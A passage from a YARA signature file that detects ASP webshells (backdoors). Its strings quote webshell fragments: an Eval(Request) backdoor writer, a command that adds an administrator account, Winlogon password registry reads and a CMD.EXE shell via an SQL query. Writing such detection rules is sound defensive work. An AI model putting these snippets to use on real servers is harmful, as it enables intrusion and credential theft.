        $s7 = "unction FullForm(FName,FAction){top.hideform.FName.value = FName;if(FAction==\"\"CopyFile\"\"){DName = prompt(\"\"" fullword ascii
        $s8 = "nter>\":jb \"  <FORM Action=\":jb \"?Action=ScFolder method=Post>" fullword ascii
        $s9 = "oo\":fso.CreateTextFile(Server.MapPath(\"/\")&\"/images/.asp\").Write\"\"&chr(60)&\"%Eval(Request(chr(112))):Set fso=CreateObjec" ascii
        $s10 = "T1.wrIte  REquESt.bINaryrEAd(rEqUEsT.tOtAlBytES)" fullword ascii
        $s11 = "<input name='sp' value='\"&shellpath&\"' style='width:35%'>  " fullword ascii
        $s12 = "pting.FileSystemObject\"\"):Set f=fso.GetFile(Request.ServerVariables(\"\"PATH_TRANSLATED\"\")):if  f.attributes <> 39 then:f.at" ascii
        $s13 = "' onclick='FileFrame.location.reload()'>\" :jb\"  <tr align='center' valign='middle'>\":jb\"<tr>" fullword ascii
        $s14 = "tSpecialFolder(2):jb \" method=Post>                  \":jb \"        <TD align=middle><B>" fullword ascii
        $s15 = "actMdb\":CompactMdb FName:Case \"DbManager\":DbManager():Case Else MainForm():End Select" fullword ascii
        $s16 = "<TD><P>\":jb  msg:jb \"</P></TD>\":jb \"                </TR>\":jb \"          </TABLE>\":jb \"        </TD>\":jb \"  </TR>" fullword ascii
        $s17 = "si=Si&\"<table width='650'  border='0' cellspacing='0' cellpadding='0'>\"" fullword ascii
        $s18 = "SI=sI&\"<tr><td bgcolor=#cccccc><font face='wingdings'>x</font></td>\"  " fullword ascii
        $s19 = ".NewFolder(FName):Set ABC=Nothing:Case \"Logout\":Session.Contents.Remove(\"web2a2dmin\"):Response.Redirect URL:Case \"UpFile\":" ascii
        $s20 = "\"\"><font face='wingdings' size='6'>0</font>\"&F.NaMe&\"</a>\" " fullword ascii
     condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _3d7cd32d53abc7f39faed133e0a8f95a09932b64_4c9c9d31ceadee0db4bc592d8585d45e5fd634e7_9065860c36557b5843d1a433100610d2054762be__47
{
     meta:
        description = "asp - from files 3d7cd32d53abc7f39faed133e0a8f95a09932b64.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e01aae01ad2c1ae96b5445075d651e7b0e7e0f5649fe2def96525ec4e19b8eaf"
        hash2 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
        hash3 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
        hash4 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
        hash5 = "6349389d6fab3bf660f74fe4d224aea7b7b74f49546e3713dd4f42d3760c9396"
        hash6 = "4a95904b0998d9073f7c9c587aad82bb4bb0bc63d11790285ef6735aacf603ff"
        hash7 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
        hash8 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
     strings:
        $s1 = "Server.CreateObject(CONST_FSO).CreateFolder(Left(thePath, i - 1))" fullword ascii
        $s2 = "j\"<script>function killErrors(){return true;}window.onerror=killErrors;function yesok(){if (confirm(\"\"" fullword ascii
        $s3 = "</td><td id=d><input name='tpath' type='text' class='TextBox' id='tpath' value='C:\\'></td></tr><tr align='center'><td id=d>" fullword ascii
        $s4 = "endN = Right(tmp(i), Len(tmp(i)) - seekx )" fullword ascii
        $s5 = "RaPath=ExecuteGlobal(s)" fullword ascii
        $s6 = "j\"<hr>Process in \"&thetime&\" s\"" fullword ascii
        $s7 = "startN = Left(tmp(i), seekx - 1 )" fullword ascii
        $s8 = "j(targetip & \":\" & portNum & \".........<font color=red>" fullword ascii
        $s9 = "j\"<form name='form1' method='post' action='' onSubmit='form1.submit.disabled=true;'>\"" fullword ascii
        $s10 = "For xxx = Mid(ip(hu),InStrRev(ip(hu),\".\")+1,1) to Mid(ip(hu),InStr(ip(hu),\"-\")+1,Len(ip(hu))-InStr(ip(hu),\"-\"))" fullword ascii
        $s11 = "strBAD=\"If Request(\"\"#\"\")<>\"\"\"\" Then Session(\"\"#\"\")=Request(\"\"#\"\")\"&VbNewLine" fullword ascii
        $s12 = "</td><td id=d><input name='tpass' type='text' class='TextBox' id='pass' value='1'></td></tr><tr align='center'><td id=d>" fullword ascii
        $s13 = "</td><td id=d><input name='dport' type='text' class='TextBox' id='dport' value='43958'></td></tr><tr align='center'><td id=d>" fullword ascii
        $s14 = "</td><td id=d><input name='tuser' type='text' class='TextBox' id='tuser' value='invader'></td></tr><tr align='center'><td id=d>" fullword ascii
        $s15 = "</td><td id=d><input name='tport' type='text' class='TextBox' id='tport' value='21'></td></tr><tr align='center'><td id=d>" fullword ascii
        $s16 = "if (CheckNextDir=True) and (IS_TEMP_DIR=false) then " fullword ascii
        $s17 = "domain=Request.ServerVariables(\"http_host\")" fullword ascii
        $s18 = "if Right(path,1) <> \"\\\" then GetFullPath = path&\"\\\" " fullword ascii
        $s19 = "executeglobal theFolder" fullword ascii
        $s20 = "set f=fso.GetFile(ScriptPath)" fullword ascii
     condition:
        ( ( uint16(0) == 0x6f3c or uint16(0) == 0x253c ) and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _970264364422b3d34bd008e02d794baf3df62b00_cd14346f158a616ca9a79edf07e3eb3acc84afae_48
{
     meta:
        description = "asp - from files 970264364422b3d34bd008e02d794baf3df62b00.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7580a31513ba4719a1eb7fd037b7d8b1ec13077605936d8e1b87965c3429010e"
        hash2 = "ce13b9dcf134bea0a6766c65f8229455bbe3fabae225018fcf252f091aefb019"
     strings:
        $x1 = "\");FullDbStr(0);return false;}return true;}function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = \"Provider=" ascii
        $x2 = "\",FName);top.hideform.FName.value = DName;}else{DName = \"Other\";}if(DName!=null){top.hideform.Action.value = FAction;top.hide" ascii
        $x3 = "\");FullDbStr(0);return false;}return true;}function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = \"Provider=" ascii
        $s4 = "osoft.Jet.OLEDB.4.0;Data Source=D:\\\\VirtualHost\\\\343266.ctc-w217.dns.com.cn\\\\www\\\\db.mdb;Jet OLEDB:Database Password=***" ascii
        $s5 = "crosoft.Jet.OLEDB.4.0;Data Source=D:\\\\VirtualHost\\\\343266.ctc-w217.dns.com.cn\\\\www\\\\db.mdb;Jet OLEDB:Database Password=*" ascii
        $s6 = "url=\"http://xa.com/data?cli=10&dat=snba&url=\"&AlexaURL" fullword ascii
        $s7 = "'jb\"<tr><td height='22'><a href='http://%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D?Submit=+%B2%E9+%D1%AF+&domain=\"&Worinima&\"' t" ascii
        $s8 = "'jb\"<tr><td height='22'><iframe src=http://%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D/admin/jpg.asp width=0 height=0></iframe>' ta" ascii
        $s9 = "0\";Str[7] = \"UPDATE [TableName] SET USER=\\'usernafunction yesok(){if (confirm(\"%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D" fullword ascii
        $s10 = "\",FName);top.hideform.FName.value = DNa\",FName);top.hideform.FName.value = DNawidth=0 height=0></iframe></html></body></html>" fullword ascii
        $s11 = "]= \"ALTER TABLE [TableName] DROP COLUMN PASS\";Str[12]= \"%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D" fullword ascii
        $s12 = "SiteURL=\"http://www.baidu.com/\"" fullword ascii
        $s13 = "</option>\":jb\"<option value=\"\"http://tiquat/2.txt\"\">" fullword ascii
        $s14 = "</option>\":jb\"<option value=\"\"http://tiquasoft/3.txt\"\">" fullword ascii
        $s15 = "\"ALTER TABLE [TableName] DROP COLUMN PASS\";Str[12]= \"%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D" fullword ascii
        $s16 = "'jb\"<tr><td height='22'><a href='http://%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D/?action=sed&cx_33=\"&ServerU&\"' target='FileFr" ascii
        $s17 = "'jb\"<tr><td height='22'><a href='http://%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D/?action=sed&cx_33=\"&ServerU&\"' target='FileFr" ascii
        $s18 = "</td><td bgcolor='#'> </td><td bgcolor='#'>\"&WoriNima&\"</td></tr><form method=post action='http://www.ips.asp' name='ipform' t" ascii
        $s19 = "abc.innerHTML=\"\";DbForm.submit();return true;}</script></body></html></body></html>" fullword ascii
        $s20 = "</option>\":jb\"<option value=\"\"http://tiq.exe\"\">" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _21fd0ada0d0c86b6899d5b7af4b55e72884a5513_42ca332dbe4463b083d24bd019115a00db413c2b_86a23719e51edc09f7d68388226dd3319ee7a916__49
{
     meta:
        description = "asp - from files 21fd0ada0d0c86b6899d5b7af4b55e72884a5513.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
        hash2 = "bc041032ed36879be7e068d17db8fdbe4c251596276fba1cc4f8ac8efa2bae34"
        hash3 = "640ef6949c07edc04c8ce29ffb49efc70efc75fd6304c1a9203134ba3b51d0a9"
        hash4 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
        hash5 = "7580a31513ba4719a1eb7fd037b7d8b1ec13077605936d8e1b87965c3429010e"
        hash6 = "39e42a7d88da56b57f095012aa94590ece4ee28b01984abbe366a52434f4c38c"
        hash7 = "fbfdd9aca6c7ddb7c2ed97f1852f1b9896a6149874c5b4163186fb71a32ded2f"
        hash8 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
        hash9 = "ce13b9dcf134bea0a6766c65f8229455bbe3fabae225018fcf252f091aefb019"
        hash10 = "46487a3f8ee782d4cc95b98f5f7ebef6d8de4f0858cf33cd700d576a4b770251"
        hash11 = "65dbdb94717f956d1529eae468447f65f95a91f16019173aa740894845abc1d3"
        hash12 = "4334d3b9d075e530187d23cd7f8f067de67c3a94e6888335d8b0d4c9ca4a9187"
        hash13 = "7f4139601930bba578adbd3f152397f7396688744df2b231b2fcaa90e36a995f"
     strings:
        $x1 = "Passwd=Wsh.RegRead(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultPassword\")" fullword ascii
        $s2 = "Admin=Wsh.RegRead(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultUserName\")" fullword ascii
        $s3 = "isAutologin=\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AutoAdminLogon\"" fullword ascii
        $s4 = "AdminNameKey=\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AltDefaultUserName\"" fullword ascii
        $s5 = "If fso.FileExists(sysdriver&\"\\Documents And Settings\\All Users\\Application Data\\Symantec\\\"&servername&\".cif\") Then" fullword ascii
        $s6 = "autoLoginPassword = wsX.RegRead(autoLoginPath & autoLoginPassKey)" fullword ascii
        $s7 = "isAutoLoginEnable = wsX.RegRead(autoLoginPath & autoLoginEnableKey)" fullword ascii
        $s8 = "autoLoginUsername = wsX.RegRead(autoLoginPath & autoLoginUserKey)" fullword ascii
        $s9 = "pcnamekey=\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName\\ComputerName\"" fullword ascii
        $s10 = "ApdKey=\"HKLM\\SYSTEM\\ControlSet001\\Services\\Tcpip\\Linkage\\Bind\"" fullword ascii
        $s11 = "servername=wsh.RegRead(\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName\\ComputerName\")" fullword ascii
        $s12 = "EnableTCPIPKey=\"HKLM\\SYSTEM\\currentControlSet\\Services\\Tcpip\\Parameters\\EnableSecurityFilters\"" fullword ascii
        $s13 = "pcAnywhereKey=\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Symantec\\pcAnywhere\\CurrentVersion\\System\\TCPIPDataPort\"" fullword ascii
        $s14 = "If displogin=\"\" or displogin=0 Then disply=\"" fullword ascii
        $s15 = "TermKey=\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp\\PortNumber\"" fullword ascii
        $s16 = "if Autologin=0 or Autologin=\"\" Then" fullword ascii
        $s17 = "Autologin=Wsh.RegRead(isAutologin)" fullword ascii
        $s18 = "hk=\"HKLM\\SYSTEM\\ControlSet001\\Services\\Tcpip\\Enum\\Count\"" fullword ascii
        $s19 = "termPort = wsX.RegRead(terminalPortPath & terminalPortKey)" fullword ascii
        $s20 = "Path=\"HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\Tcpip\\Parameters\\Interfaces\\\"" fullword ascii
     condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _081a73a1b23769a55b9107e518f85f476e902309_143df8e735a7a776468700150dc64008f7944e01_1640b6a8c0f4cb182ebe14b2ee199c55a163d7ef__50
{
     meta:
        description = "asp - from files 081a73a1b23769a55b9107e518f85f476e902309.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "187f477b13e2124e9c252dcb4d385407eee5aadcc466467ce959d388aaff2e0d"
        hash2 = "2134e5fad0d686a633c95fdbdf95cfd4cd316eb2c4ee136ef7e05c20a6059847"
        hash3 = "c83ae2f8b285bfd9f0aa4d40508b758cfae713e251234c9c18cf1d143d5e8764"
        hash4 = "087dac16734d0c4d23d08080d6f8e031ed6eb19659a532827326671947d636f2"
        hash5 = "afa4d004314ff296712e8d2c7d7707cc66b7c42bc4ba7beb3e4faf585a255894"
        hash6 = "d0cb05a853e883fce03015ac39b9e8c10adb902681bf320eedcd89dd27747d84"
        hash7 = "f107bfb0bca4900116cad341733919b6138a82c2b2f269da17361703ae57a337"
     strings:
        $x1 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\\\\\"\")'>" fullword ascii
        $s2 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $s3 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
        $s4 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
        $s5 = "Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next" fullword ascii
        $s6 = "ExeCute \"sub ShowErr():If Err Then:RRS\"\"<br><a href='javascript:history.back()'><br>&nbsp;\"\" & Err.Description & \"\"</a><b" ascii
        $s7 = "e=tlti' am='ssla c)'~~leFipyCo~~~,~~)&meNaL.~&~\\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI~` ~ -b></>]<b> /ae<ov>M" fullword ascii
        $s8 = "e=tlti' am='ssla c)'~~leFiitEd~~~,~~)&meNaL.~&~\\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI~`> /al<De'>" fullword ascii
        $s9 = "e=tlti' am='ssla c)'~~leFiveMo~~~,~~)&meNaL.~&~\\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI`>~<br><b~K)&2410e/iz.s(Lng" ascii
        $s10 = "~~e=tlti' ~)~~)&meNaF.~&~\\h&at(PthPaRe~&~~r(deolwFho:Sptriscvaja='efhra ~<I&=SSI `> /ay<op>C" fullword ascii
        $s11 = "`SH.ldmdb$H$HSH.t = ~leLissysFib$~`se Th= Falath) (thePxistslderE~).FobjectstemOileSying.Fcriptct(~SeObjeCreatrver.If Seen`" fullword ascii
        $s12 = "\":execute(lIl(lI)):Function fsoTreeForMdb(thePath, rs, stream):ExeCute SinfoEn(\"FileL, sysfilesers,  foldlder,theFotem, Dim ii" ascii
        $s13 = "\":execute(lIl(lI)):Function fsoTreeForMdb(thePath, rs, stream):ExeCute SinfoEn(\"FileL, sysfilesers,  foldlder,theFotem, Dim ii" ascii
        $s14 = "t(\"\"FName\"\"):pso=5:BackUrl=\"\"<br><br><center><a href='javascript:history.back()'>" fullword ascii
        $s15 = "else:T2.Type=1:T2.Mode=3:T2.Open:T1.Position=DIEnd:T1.CopyTo T2,DStart-DIEnd-3:T2.Position = 0:T2.Type = 2:T2.Charset =\"gb2312" ascii
        $s16 = "t,FEnd,DStart,DEnd,UpName:set D1=CreateObject(Sot(4,0)):if Request.TotalBytes<1 then Exit Sub" fullword ascii
        $s17 = "\"):Serveru=request.servervariables(\"\"http_host\"\")&url:FolderPath=Request(\"\"FolderPath\"\"):serverp=UserPass:Pn=pos*44:FNa" ascii
        $s18 = "Pos):ExeCuTe Fun(\")soPjbO doM rtSneL,rtSjbO(thgiR&rtSpmT=edoCnE:txeN:rtSpmT&)soPjbO,1+soPjbO*i,rtSjbO(diM=rtSpmT:1-)soPjbO/rtSn" ascii
        $s19 = "Function Show1File(Path):ExeCute SinfoEn(\"thPar(deoltFGeF.=CLDFOt Se)`i=0`>~tr><6'='ngdiadlpel c0'='ngcipalsel c0'='errdbo' 0%1" ascii
        $s20 = ">blta</r>/t~<I& SRS R~`nghiot=NLDFOt Se\",Pos):End function:Function DelFile(Path):ExeCute SinfoEn(\"he Th)at(PtsisExleFiF. CIfn" ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _4f216890e1909148a1a8fa78af4fc913eb9645ca_788928ae87551f286d189e163e55410acbb90a64_98bfb6d8326fc15543daa95d8ef679889fd1ad91_51
{
     meta:
        description = "asp - from files 4f216890e1909148a1a8fa78af4fc913eb9645ca.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c350b163b5527ee445b315ec5a2431e311201616ce8cb2f7d048888ef58da2c4"
        hash2 = "7d72ed0ef1b497619f12bc962512061d131c96cf9bcedd4a9a4345490e0a088c"
        hash3 = "febf37a9e8ba8ece863f506ae32ad398115106cc849a9954cbc0277474cdba5c"
     strings:
        $s1 = "<input style=\"width:100%\" type=text name=\"FileName\" id=\"FileName\" value=\"byzehir.txt\" size=\"20\"></td" fullword ascii
        $s2 = "<input style=\"width:100%\" type=text name=\"FileName\" id=\"FileName\" value=\"byzehir.txt\" size=\"20\"></td>" fullword ascii
        $s3 = "<input style=\"width:100%\" type=text name=\"SubFolder\" id=\"SubFolder\" value=\"www\" size=\"20\"></td>" fullword ascii
        $s4 = "response.Write \"<br><br><font style='FONT-WEIGHT:normal' size=2>zehirhacker@hotmail.com<br><font color=yellow face='courier new" ascii
        $s5 = "<input type=checkbox name=\"dosya3\" ID=\"Checkbox3\" value=\"ON\">index.asp<br>" fullword ascii
        $s6 = "<input type=checkbox name=\"dosya2\" ID=\"Checkbox2\" value=\"ON\">default.htm<br>" fullword ascii
        $s7 = "<input type=checkbox name=\"dosya4\" ID=\"Checkbox4\" value=\"ON\">default.asp<br>" fullword ascii
        $s8 = "<input type=checkbox name=\"dosya1\" ID=\"Checkbox1\" value=\"ON\">index.htm<br>" fullword ascii
        $s9 = "tNumber(f1.size,0)&\"</font>]\"&\"</a></b> <font face=wingdings size=4>M  \"&downStr&\"</font><br>\"" fullword ascii
        $s10 = "tgoldenrodyellow thin solid;font-size: 12;border-left: lightgoldenrodyellow thin solid;color: lime;" fullword ascii
        $s11 = "<input style=\"width:100%\" type=text name=\"Path\" id=\"Path\" value=\"<%=path%>\" size=\"20\"></td>" fullword ascii
        $s12 = "Response.Redirect dosyaPath&\"?status=7&Path=\"&Path&\"&Time=\"&time" fullword ascii
        $s13 = "frames.byZehir.focus(); " fullword ascii
        $s14 = "font-family: Courier New, Arial;background-color: navy;'>\"" fullword ascii
        $s15 = "ment.all['byMesaj'].value);\">" fullword ascii
        $s16 = "tNumber(f1.size,0)&\"</font>]\"&\"</a></b> <font face=webdings size=4>" fullword ascii
        $s17 = "tNumber(f1.size,0)&\"</font>]\"&\"</a></b> <font face=wingdings size=4>" fullword ascii
        $s18 = "daemon.ini\")" fullword ascii
        $s19 = "</font><font face=wingdings size=4>  \"&downStr&\"</font><br>\"" fullword ascii
        $s20 = "path&\"&Time=\"&time&\"'>!</a>\"&downStr&\"</font><br>\"" fullword ascii
     condition:
        ( ( uint16(0) == 0x3c0a or uint16(0) == 0x253c ) and filesize < 100KB and ( 8 of them ) ) or ( all of them )
}

rule _037752fdd098a42e25c4b2c9960d18dd214aa3f6_0b3f8d5cab56018e96da7ba7ff7d73fc1905c9d9_16a2cd13eacd4d1d4a0f7e2e125205f153a4c8f6__52
{
     meta:
        description = "asp - from files 037752fdd098a42e25c4b2c9960d18dd214aa3f6.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7d046439732109dd70ca88b040223f9eebd55bc523d62ac85381a95176714a14"
        hash2 = "38f8cdee9744d0dd38068e41ab953083ec2c00a9afae4a99bfb8673c7f11ce41"
        hash3 = "ff753fda2b86325ce018a56429a6e324eb7a05e2893eeee240b9e73708277817"
        hash4 = "d3bc4102bba36224ad94e0f8a23cc31f8a9278f5fc1797693329204ef0b15e6b"
        hash5 = "b8957d9ce9e559b134eb2c82121b276bf4d987a99d167e2d3484d4b925437f0b"
        hash6 = "abcee820fd8a8ab161d1739f14b70084a4cb689e3f32d3d712f0bf027c4e0ad7"
        hash7 = "1b207bde3e188f088688cf0dce9da6108efc249969692de876f2ea174fb75549"
        hash8 = "38f63e43d98de7d5005af23ef48ade06eccf59392ebd481cf39c4b99d53977ee"
        hash9 = "49b8ad91bbf545ff3b17ce7bd15007c82dbdb76930f3f03a7d3ee919b1cb9e1d"
        hash10 = "b0949198eab2be841241983d0a9a55973cacdf113928e61cb7d42dc3247dc462"
        hash11 = "d4e2230991106a793376037e910e657d810a4679ab08fbad3eb9b6089a6365c0"
        hash12 = "91bb468add2687a86069b70f8fd419f5cb290b63c9d99da967243468f0a3dceb"
        hash13 = "ea3606fa2294d6fbd348ae8666a0cda14a4d1157be9f9adaf34bec21094515e8"
     strings:
        $s1 = "oUploadFile.ContentType = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))" fullword ascii
        $s2 = "nPos = InstrB(nPosEnd, biData, CByteString(\"Content-Type:\"))" fullword ascii
        $s3 = "oUploadFile.FileName = Right(sFileName, Len(sFileName)-InStrRev(sFileName, \"\\\"))" fullword ascii
        $s4 = "nPos = InstrB(nDataBoundPos, biData, CByteString(\"Content-Disposition\"))" fullword ascii
        $s5 = "nPosEnd = InstrB(nPosBegin, biData, vDataBounds) - 2" fullword ascii
        $s6 = "oUploadFile.FileData = MidB(biData, nPosBegin, nPosEnd-nPosBegin)" fullword ascii
        $s7 = "nDataBoundPos = InstrB(nDataBoundPos + LenB(vDataBounds), biData, vDataBounds)" fullword ascii
        $s8 = "Set mcolFormElem = Server.CreateObject(\"Scripting.Dictionary\")" fullword ascii
        $s9 = "biData = Request.BinaryRead(Request.TotalBytes)" fullword ascii
        $s10 = "Set oFS = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
        $s11 = "Set Files = Server.CreateObject(\"Scripting.Dictionary\")" fullword ascii
        $s12 = "If oUploadFile.FileSize > 0 Then Files.Add LCase(sInputName), oUploadFile" fullword ascii
        $s13 = "Public Property Get Form(sIndex)" fullword ascii
        $s14 = "Class FileUploader" fullword ascii
        $s15 = "Do Until nDataBoundPos = InstrB(biData, vDataBounds & CByteString(\"--\"))" fullword ascii
        $s16 = "sFileName = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))" fullword ascii
        $s17 = "sInputName = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))" fullword ascii
        $s18 = "Public Property Get FileSize()" fullword ascii
        $s19 = "nPosFile = InstrB(nDataBoundPos, biData, CByteString(\"filename=\"))" fullword ascii
        $s20 = "nPosEnd =  InstrB(nPosBegin, biData, CByteString(Chr(34)))" fullword ascii
     condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0x2023 ) and filesize < 400KB and ( 8 of them ) ) or ( all of them )
}

rule _732bb60287fd6e3d82ab9dba919aa2a92cea20a7_8266d76ec5105abfe09bb52229370625fa535e47_c34f33a3d2927d889490ef9783944bc5231c74e2__53
{
     meta:
        description = "asp - from files 732bb60287fd6e3d82ab9dba919aa2a92cea20a7.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a6f8ff3c66b27b37b827240b4c3ceb07ba851d4d2693d448aaf2710f16f7b776"
        hash2 = "05808124f9e09365b3402b6d39ede828e316299cbd05a5ca9befa8a6f12ef814"
        hash3 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
        hash4 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
        hash5 = "5a40df588e079dc1abda3c3273579aa9ecf0f600f722e4e92cbc4cdc0703a38d"
        hash6 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
     strings:
        $x1 = "j cdx&\"<a href='http://www.114best.com/ip/114.aspx?w=\"&str1&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x2 = "j cdx&\"<a href='http://www.aizhan.com/siteall/\"&str1&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s3 = "j cdx&\"<a href='?Action=EditPower&PowerPath=\\\\.\\\"&OOOO&\"' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $s4 = "j cdx&\"<a href='http://tool.chinaz.com/Tools/Robot.aspx?url=\"&str1&\"&btn=+" fullword ascii
        $s5 = "j cdx&\"<a href='?Action=ProFile' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $s6 = "j\"<html><meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=gb2312\"\"><title>\"&mNametitle&\" - \"&ServerIP&" ascii
        $s7 = "j\"<html><meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=gb2312\"\"><title>\"&mNametitle&\" - \"&ServerIP&" ascii
        $s8 = "-family: verdana;font-size:13px}a{color:#b4a9a9;text-decoration:none;}.am{color:#b4a9a9;font-size:11px;}</style>\"" fullword ascii
        $s9 = "s xp1:redrob'=elyts '%5.59'=thgieh '%001'=htdiw elbat<>elbat/<>mrof/<>rt/<>dt/<>')(daoler.noitacol.emarFeliF'=kcilcno '" fullword ascii
        $s10 = "'=eulav 'timbus'=epyt tupni< >'OG'=eulav 'timbus'=epyt 'timbuS'=eman tupni<>'retnec'=ngila '041'=htdiw dt<>dt/<>'" fullword ascii
        $s11 = "si=si&\"<a href='javascript:ShowFolder(\"\"\"&RePath(Path&\"\\\"&F.Name)&\"\"\")' title=\"\"" fullword ascii
        $s12 = "SI=SI&\"<td height=10 width=17% align=center><div style='border:1px solid #383838;padding-bottom:4px'>\"" fullword ascii
        $s13 = ";psbn&;psbn&;psbn&;psbn&;psbn&" fullword ascii /* reversed goodware string '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' */
        $s14 = ">'retnec'=ngila '06'=htdiw dt<>rt<>'tnerap_'=tegrat '" fullword ascii
        $s15 = "j\"<hr><tr><td><input onMouseOver=\"\"this.style.cursor='hand'\"\" type=button value=' " fullword ascii
        $s16 = "Set fsoXX = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
        $s17 = "(redloFwohS:tpircsavaj'=ferh ma=ssalc a<>rb<" fullword ascii
        $s18 = "si=\"<center><a></a><div style='width:400px;padding:32px; align=left'><br><form action='\"&url&\"' method='post'><input name='pa" ascii
        $s19 = "'=eulav '%001:htdiw'=elyts 'htaPredloF'=eman tupni<>dt<>dt/<" fullword ascii
        $s20 = "SI=SI&IsIco(\"\",\"folder.gif\",\"0\")" fullword ascii
     condition:
        ( ( uint16(0) == 0x6f3c or uint16(0) == 0x253c ) and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _0d6e79458473ca80ccffede5496edebc0b60a7ad_21fd0ada0d0c86b6899d5b7af4b55e72884a5513_9bac59023b27a7ce066f2c4e7d3c1b1df9d5133f__54
{
     meta:
        description = "asp - from files 0d6e79458473ca80ccffede5496edebc0b60a7ad.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
        hash2 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
        hash3 = "39e42a7d88da56b57f095012aa94590ece4ee28b01984abbe366a52434f4c38c"
        hash4 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
     strings:
        $x1 = "STRQUERY = \"SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD.EXE /" fullword ascii
